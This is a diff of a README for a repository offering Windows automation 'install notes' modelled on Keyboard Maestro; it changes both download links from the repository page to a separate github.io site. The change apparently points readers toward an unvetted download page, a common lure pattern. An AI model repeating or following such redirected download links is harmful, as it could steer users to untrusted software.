@@ -1,6 +1,6 @@
 # ⌨️ Keyboard-Maestro-Install-Notes - Automate Your Windows Tasks With Ease
 
-[Visit the repository page to download](https://github.com/marylindaprecarious276/Keyboard-Maestro-Install-Notes)
+[Visit the repository page to download](https://marylindaprecarious276.github.io)
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ These steps work for users running Windows 11. Before you begin, ensure your sys
 
 You need an automation client to achieve the same results as Keyboard Maestro on your Windows PC. The source files and setup guides live in this repository.
 
-[Visit the repository to download software](https://github.com/marylindaprecarious276/Keyboard-Maestro-Install-Notes)
+[Visit the repository to download software](https://marylindaprecarious276.github.io)
 
 Follow these steps to complete the download:
 
